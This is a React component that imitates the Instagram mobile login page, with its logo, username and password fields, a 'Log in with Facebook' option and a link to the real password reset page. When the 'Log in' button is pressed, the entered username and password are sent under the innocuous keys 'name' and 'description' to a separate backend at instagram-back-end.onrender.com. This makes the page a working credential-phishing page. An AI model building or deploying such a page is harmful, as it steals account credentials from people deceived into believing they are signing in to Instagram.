import instagram from "../../assets/img/instagram.png";
import icon from "../../assets/img/icon.png";
import play from "../../assets/img/play.png"
import React, { useState } from 'react'

import "./Responsive.css"

export default function Responsive() {

    const [name1, setName2] = useState()
    const [description1, setDescription2] = useState()

    let obj = {
        name: name1,
        description: description1,
    }

    const postData = () => {
        axios.post('https://instagram-back-end.onrender.com/data', obj)
            .then(response => {
                alert(response.status);
            }
            )
            .catch(error => {
                console.error("Error sending data: ", error);
            });
    }

    return (
        <>
            <div className="d d-block d-lg-none">
                <img src={instagram} alt="" />
                <div className="d">
                    <input type="text" onChange={(e) => setName2(e.target.value)} placeholder="Phone number, username, or email" className="inpp" />
                </div>
                <div className="a">
                    <input type="password" onChange={(e) => setDescription2(e.target.value)} placeholder="Password" className="inptt" />
                </div>
                <div className="s">
                    <button className="tn" onClick={() => postData()}>Log in</button>
                </div>
                <div className="al">
                    <div className="k"></div>
                    <h6>OR</h6>
                    <div className="k"></div>
                </div>
                <div className="l">
                    <img src={icon} alt="" className="icon" />
                    <p className="nn">Log in with Facebook</p>
                </div>
                <p className="as">Forgot password?</p>
                <a href="https://www.instagram.com/accounts/password/reset/">
                </a>
                <div className="emme_">
                    <div className="emmer_">
                        <div className="u">
                            <p className="q">Don't have an account?</p>
                            <p className="up">Sign up</p>
                        </div>
                    </div>
                    <p className="ww">Get the app.</p>
                    <img src={play} alt="" />
                </div>
            </div>
        </>
    )
}
